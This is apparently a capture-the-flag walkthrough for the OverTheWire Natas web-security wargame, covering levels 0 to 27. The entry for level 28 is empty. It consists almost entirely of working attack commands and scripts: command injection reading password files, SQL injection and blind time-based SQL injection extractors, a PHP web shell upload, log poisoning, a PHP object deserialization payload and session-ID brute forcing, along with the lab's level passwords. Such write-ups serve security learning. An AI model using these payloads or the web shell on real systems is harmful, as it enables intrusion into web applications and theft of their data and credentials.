
### natas0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

    $ curl -s -H "Authorization: Basic `echo -n 'natas0:natas0' | base64`" http://natas0.natas.labs.overthewire.org | grep
natas1

### natas1

```
natas1
passwd: gtVrDuiDfck831PqWsLEZy5gyDz1clto
```

    $ curl -s -H "Authorization: Basic `echo -n 'natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto' | base64`" http://natas1.natas.labs.overthewire.org | grep natas2

### natas2

    $ curl -s -H "Authorization: Basic `echo -n 'natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi' | base64`" http://natas2.natas.labs.overthewire.org/files/users.txt | grep natas3

### natas3

```
$ curl -s -H "Authorization: Basic `echo -n 'natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14' | base64`" http://natas3.natas.labs.overthewire.org/robots.txt

$ curl -s -H "Authorization: Basic `echo -n 'natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14' | base64`" http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | grep natas4
```

### natas4

    $ curl -s -H "Referer: http://natas5.natas.labs.overthewire.org/" -H "Authorization: Basic `echo -n 'natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ' | base64`" http://natas4.natas.labs.overthewire.org/

### natas5

```
$ curl -s -v -H "Authorization: Basic `echo -n 'natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq' | base64`" http://natas5.natas.labs.overthewire.org/ 2>&1 | grep Cookie

$ curl -s -b "loggedin=1" -H "Authorization: Basic `echo -n 'natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq' | base64`" http://natas5.natas.labs.overthewire.org/ | grep natas6
```

### natas6

After viewing source code it's clear that secret is in `/includes/secret.inc`:`

```
# extract secret:
$ SECRET=$(curl -s -H "Authorization: Basic `echo -n 'natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1' | base64`" http://natas6.natas.labs.overthewire.org/includes/secret.inc | grep secret | cut -d '"' -f2)

$ curl -s -H "Authorization: Basic `echo -n 'natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1' | base64`" http://natas6.natas.labs.overthewire.org/ -d "secret=$SECRET&submit=1"
```

### natas7

**Vuln:** basic directory traversal

```
# read the hint:
$ curl -s -H "Authorization: Basic `echo -n 'natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9' | base64`" http://natas7.natas.labs.overthewire.org/ | grep hint

# extract the password:
$ curl -s -H "Authorization: Basic `echo -n 'natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9' | base64`" http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8 | tail -6 | head -1
```

### natas8

```
http://natas8.natas.labs.overthewire.org
natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

```
# reverse the encoding function available in source code:
$ SECRET=$(echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d)

$ curl -s -H "Authorization: Basic `echo -n 'natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe' | base64`" http://natas8.natas.labs.overthewire.org/ -d "secret=$SECRET&submit=1" | grep natas9
```

### natas9

    $ curl -s -H "Authorization: Basic `echo -n 'natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl' | base64`" http://natas9.natas.labs.overthewire.org/index.php -d "needle=;cat+/etc/natas_webpass/natas10;&submit=Search" | tail -7 | head -1

### natas10

This time following Bash commands separators: `;|&` are filtered so use `\n`:

    $ curl -s -H "Authorization: Basic `echo -n 'natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu' | base64`" http://natas10.natas.labs.overthewire.org/index.php -d "needle=%0acat+/etc/natas_webpass/natas11%0a&submit=Search"  | tail -7 | head -1

### natas11

```
natas11
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

Exploit:

```
import os, sys
import httplib
import urllib
import base64
import json
import re
import binascii
import string

# xor two strings of different lengths
def strxor(a, b):     
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

user = "natas11"
passwd = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"

authToken = urllib.quote(base64.b64encode(user + ":" + passwd))

headers = {
    "Authorization": "Basic " + authToken,
}

## find key
inputString = '{"showpassword":"no","bgcolor":"#ffffff"}'

conn = httplib.HTTPConnection("127.0.0.1", 8080)
conn.request("GET", "http://natas11.natas.labs.overthewire.org", "", headers)
r = conn.getresponse()

cookie = r.getheader("Set-Cookie").split("=")[1]
cookie_raw = base64.b64decode(urllib.unquote(cookie))

# key has 4 chars
key = strxor(cookie_raw, inputString)[0:4]

## construct new request
inputString2 = '{"showpassword":"yes","bgcolor":"#ffffff"}'

# calculate key stream longer than len(inputString2)
tKey = key * 11

# prepare new cookie
cookie_raw2 = strxor(inputString2, tKey[0:-2])
cookie2 = urllib.quote(base64.b64encode(cookie_raw2))
headers["Cookie"] = "data=" + cookie2

conn.request("GET", "http://natas11.natas.labs.overthewire.org", "", headers)
r = conn.getresponse()
print r.read()

conn.close()
```

### natas12

```
natas12
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
http://natas12.natas.labs.overthewire.org/
```

```
# construct payload:
cat > uplo.php <<EOF
<?php system($_GET['cmd']) ?>
EOF

# upload file
$ curl -s -H "Authorization: Basic `echo -n 'natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3' | base64`" http://natas12.natas.labs.overthewire.org/ -F "MAX_FILE_SIZE=1000" -F "filename=mzet.php" -F "uploadedfile=@uplo.php;filename=uplo.php"

# execute OS command
$ curl -s -H "Authorization: Basic `echo -n 'natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3' | base64`" "http://natas12.natas.labs.overthewire.org/upload/qid24hf8mp.php?cmd=cat+/etc/natas_webpass/natas13"
```

### natas13

```
natas13
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

```
# prepend jpg magic number to previous payload:
$ echo -e '\xff\xd8\xff\xe0'`cat uplo.php` > uplo2.php

# upload file
$ UPLOADED=$(curl -s -H "Authorization: Basic `echo -n 'natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY' | base64`" http://natas13.natas.labs.overthewire.org/ -F "MAX_FILE_SIZE=1000" -F "filename=mzet.php" -F "uploadedfile=@uplo2.php;filename=uplo2.php" | grep upload | awk -F 'upload/' '{print $2}' | cut -d '"' -f1)

$ curl -s -H "Authorization: Basic `echo -n 'natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY' | base64`" "http://natas13.natas.labs.overthewire.org/upload/${UPLOADED}?cmd=cat+/etc/natas_webpass/natas14"
```

### natas14

```
natas14
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

    $ curl -s -H "Authorization: Basic `echo -n 'natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1' | base64`" "http://natas14.natas.labs.overthewire.org/" -d 'username=a"+or+1=1#' | grep natas15

### natas15

**Target:**

```
natas15
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

**Vuln:** blind sqli

```
natas16" or password="a"#
natas16" and ascii(substring(password,1,1))="a"#
natas161" or ascii(substring(username,1,1))=110#
```

Exploit:

```
cat > natas15-exploit.py <<EOF
import os, sys
import httplib
import urllib
import base64
import json
import re
import binascii
import string

user = "natas15"
passwd = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

authToken = urllib.quote(base64.b64encode(user + ":" + passwd))

headers = {
    "Content-type": "application/x-www-form-urlencoded",
    "Authorization": "Basic " + authToken,
}

# connection via proxy
conn = httplib.HTTPConnection("127.0.0.1", 8080)

key=""
keyLen = 32

for i in xrange(1, keyLen + 1):
    for c in string.printable:
        payload = 'natas16" and ascii(substring(password,%d,1))=%d#' % (i, ord(c))
        params = urllib.urlencode({'username': payload})
        conn.request("POST", "http://natas15.natas.labs.overthewire.org", params, headers)
        resp = conn.getresponse().read()
        #print resp
        if resp.find("This user exists.") != -1:
            key += c
            break

print "Key: " + key

conn.close()
EOF
```

### natas16

```
natas16
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
http://natas16.natas.labs.overthewire.org/index.php
```

**Vuln:**

    curl -s -H "Authorization: Basic `echo -n 'natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh' | base64`" http://natas16.natas.labs.overthewire.org/index.php -d 'needle=$(grep e /etc/natas_webpass/natas17)zoomed&submit=Search'

Exploit:

```
cat > natas16-exploit.py <<EOF
import httplib
import urllib
import base64
import json
import re
import binascii
import string

user = "natas16"
passwd = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

authToken = urllib.quote(base64.b64encode(user + ":" + passwd))

headers = {
    "Content-type": "application/x-www-form-urlencoded",
    "Authorization": "Basic " + authToken,
}

# connection via proxy
conn = httplib.HTTPConnection("127.0.0.1", 8080)

key=""
keyLen = 32
keychars = ""

# get alphabet
for c in string.ascii_letters + string.digits:
    payload = '$(grep %s /etc/natas_webpass/natas17)zoomed' % (c)
    params = urllib.urlencode({'needle': payload, 'submit': "Search"})
    conn.request("POST", "http://natas16.natas.labs.overthewire.org", params, headers)
    resp = conn.getresponse().read()
    # current character (c) present in they key:
    if resp.find("zoomed") == -1:
        keychars += c

for i in xrange(0, keyLen):
    for c in keychars:
        candidate = key + c
        payload = '$(grep ^%s /etc/natas_webpass/natas17)zoomed' % (candidate)
        params = urllib.urlencode({'needle': payload, 'submit': "Search"})
        conn.request("POST", "http://natas16.natas.labs.overthewire.org", params, headers)
        resp = conn.getresponse().read()
        # current character (c) present in they key
        if resp.find("zoomed") == -1:
            key += c
            print key
            break

conn.close()
EOF
```

### natas17

**Target:**

```
http://natas17.natas.labs.overthewire.org/index.php
natas17
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

**Vuln:** blind sqli

**Exploitation:**

Time delay based SQLi, payload used:

    # TRUE condition (username[0] = 'n'):
    natas18" and IF(ascii(substring(username,1,1))=110, sleep(3), null)#
    # FALSE condition (username[0] != 'm'):
    natas18" and IF(ascii(substring(username,1,1))=109, sleep(3), null)#

Exploit:

```
cat > natas17-exploit.py <<EOF
import os, sys
import httplib
import urllib
import base64
import string
import time

user = "natas17"
passwd = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

authToken = urllib.quote(base64.b64encode(user + ":" + passwd))

headers = {
    "Content-type": "application/x-www-form-urlencoded",
    "Authorization": "Basic " + authToken,
}

# connection via proxy
conn = httplib.HTTPConnection("127.0.0.1", 8080)

key=""
keyLen = 32

for i in xrange(1, keyLen + 1):
    for c in string.printable:
        payload = 'natas18" and IF(ascii(substring(password,%d,1))=%d, sleep(3), null)#' % (i, ord(c))
        params = urllib.urlencode({'username': payload})
        conn.request("POST", "http://natas17.natas.labs.overthewire.org", params, headers)
        start = time.time()
        resp = conn.getresponse().read()
        roundtrip = time.time() - start
        if roundtrip > 3:
            key += c
            print key
            break

conn.close()
EOF
```

### natas18

**Target:**

```
http://natas18.natas.labs.overthewire.org/index.php
natas18
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

**Vuln:** simple session hijacking

**Exploitation:**

```
$ for i in $(seq 0 640); do curl -s -b "PHPSESSID=$i" -H "Authorization: Basic `echo -n 'natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP' | base64`" "http://natas18.natas.labs.overthewire.org/"; done | grep -A2 'You are an admin'
```

### natas19

**Target:**

```
http://natas19.natas.labs.overthewire.org/index.php
natas19
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

**Exploitation:**

```
cat > natas19-exploit.py <<EOF
import os, sys
import httplib
import urllib
import base64
import string
import time
from random import randint

user = "natas19"
passwd = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

authToken = urllib.quote(base64.b64encode(user + ":" + passwd))

headers = {
    "Content-type": "application/x-www-form-urlencoded",
    "Authorization": "Basic " + authToken,
}

# connection via proxy
conn = httplib.HTTPConnection("127.0.0.1", 8080)

D2_digit = False
D3_digit = False

for i in xrange(0, 10):
    for j in xrange(0, 10):
        for k in xrange(0, 10):
            params = urllib.urlencode({'username': 'a', 'password': 'b'})
            headers["Cookie"] = "PHPSESSID=" + str(k+30)
            if D2_digit == True:
                headers["Cookie"] += str(j+30) 
            if D3_digit == True:
                headers["Cookie"] += str(i+30) 
            headers["Cookie"] += "2d61646d696e; path=/; HttpOnly"
            conn.request("GET", "http://natas19.natas.labs.overthewire.org/index.php", "", headers)
            resp = conn.getresponse().read()
            if resp.find("are an admin") != -1:
                print resp
                sys.exit(0)

            if k == 9:
                D2_digit = True
    
        if j == 9:
            D3_digit = True

conn.close()
EOF
```

### natas20

**Target:**

```
http://natas20.natas.labs.overthewire.org/index.php
natas20
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

**Vuln:** Session manipulation (via badly implemented custom session handler)

**Exploitation:**

```
$ curl -s -H "Authorization: Basic `echo -n 'natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' | base64`" http://natas20.natas.labs.overthewire.org/index.php -b 'PHPSESSID=mySessionID' -d 'name=%0aadmin+1'

$ curl -s -H "Authorization: Basic `echo -n 'natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' | base64`" http://natas20.natas.labs.overthewire.org/index.php -b 'PHPSESSID=mySessionID'
```

### natas21

**Target:**

```
http://natas21.natas.labs.overthewire.org/index.php
natas21
IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

**Vuln:** Session manipulation (via 3rd party site colocated on the same machine as target)

**Exploitation:**

```
# establish (and save session's id) session on target site
$ SESSID=$(curl -s -H "Authorization: Basic `echo -n 'natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ' | base64`" http://natas21.natas.labs.overthewire.org/index.php -v 2>&1 | grep 'Set-Cookie' | cut -d';' -f1 | cut -d'=' -f2)
$ curl -s -H "Authorization: Basic `echo -n 'natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ' | base64`" http://natas21.natas.labs.overthewire.org/index.php -b "PHPSESSID=$SESSID"

# manipulate target's session via 3rd party site 
$ curl -s -H "Authorization: Basic `echo -n 'natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ' | base64`" http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1 -d 'admin=1&submit=Update' -b "PHPSESSID=$SESSID"

$ curl -s -H "Authorization: Basic `echo -n 'natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ' | base64`" http://natas21.natas.labs.overthewire.org/index.php -b "PHPSESSID=$SESSID"
```

### natas22

**Target:**

```
http://natas22.natas.labs.overthewire.org/index.php
natas22
chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

```
$ curl -s -H "Authorization: Basic `echo -n 'natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ' | base64`" http://natas22.natas.labs.overthewire.org/index.php?revelio=1
```

### natas23

**Target:**

```
http://natas23.natas.labs.overthewire.org/index.php
natas23
D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

    $ curl -s -H "Authorization: Basic `echo -n 'natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE' | base64`" http://natas23.natas.labs.overthewire.org/index.php?passwd=11iloveyou

### natas24

**Target:**

```
Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

    $ curl -s -H "Authorization: Basic `echo -n 'natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg' | base64`" http://natas24.natas.labs.overthewire.org/index.php?passwd[]=


### natas25

**Target:**

```
Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

**Vuln:** directory traversal (simple opportunity to bypass poorly implemented filter) & lack of input validation

**Exploitation:**

```
# establish session & store session cookie
$ curl -c natas25-cookies -s -H "Authorization: Basic `echo -n 'natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c' | base64`" http://natas25.natas.labs.overthewire.org/index.php
$ SESSID=$(grep PHPSESSID natas25-cookies | awk '{print $NF}')

# send payload as 'User Agent' string and include file with the payload
$ curl -b natas25-cookies -s -H "Authorization: Basic `echo -n 'natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c' | base64`" http://natas25.natas.labs.overthewire.org/?lang=..././logs/natas25_$SESSID.log -A "<? system('cat /etc/natas_webpass/natas26'); ?>"
```

### natas26

**Target:**

```
http://natas26.natas.labs.overthewire.org/
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
natas26
```

**Vulnerability:** insecure object deserialization (https://www.owasp.org/index.php/PHP_Object_Injection)

**Exploitation:**

```
# prepare & serialize instance of Logger class
$ cat > natas26.php <<EOF
<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct($file)
    {
        $this->initMsg= "";
        $this->exitMsg= "<? system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/natas26.php";
    }
}
$logger = new Logger("");

echo serialize($logger);
?>
EOF

# set cookie and send it for deserialization:
$ COOKIE=$(php -f natas26.php | base64 -w0)
$ curl -b "drawing=$COOKIE" -s -H "Authorization: Basic `echo -n 'natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T' | base64`" http://natas26.natas.labs.overthewire.org/

# retreive flag by executing code that was prepared in previous step:
$ curl -s -H "Authorization: Basic `echo -n 'natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T' | base64`" http://natas26.natas.labs.overthewire.org/img/natas26.php
```

### natas27

**Target:**

```
http://natas27.natas.labs.overthewire.org/
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
natas27
```

**Vulnerability:** logic issue

**Exploitation:**

```
# verify that 'natas28' user exists
$ USR=natas28; curl -s -H "Authorization: Basic `echo -n 'natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ' | base64`" http://natas27.natas.labs.overthewire.org/ -d "username=$USR" -d 'password=qwe123'

# add user that will be truncated to 64 characters (varchar(64)):
$ USR=$(python2 -c 'print "natas28" + " "*64 + "AAA"'); curl -s -H "Authorization: Basic `echo -n 'natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ' | base64`" http://natas27.natas.labs.overthewire.org/ -d "username=$USR" -d 'password=qwe123'

# dump data of original 'natas28' user; checkCredentials(...) passes thanks to previously added user
$ USR=natas28; curl -s -H "Authorization: Basic `echo -n 'natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ' | base64`" http://natas27.natas.labs.overthewire.org/ -d "username=$USR" -d 'password=qwe123'
```

### natas28

**Target:**

```
http://natas28.natas.labs.overthewire.org/
JWwR438wkgTsNKBbcJoowyysdM82YjeF
natas28
```

**Vulnerability:**

**Exploitation:**
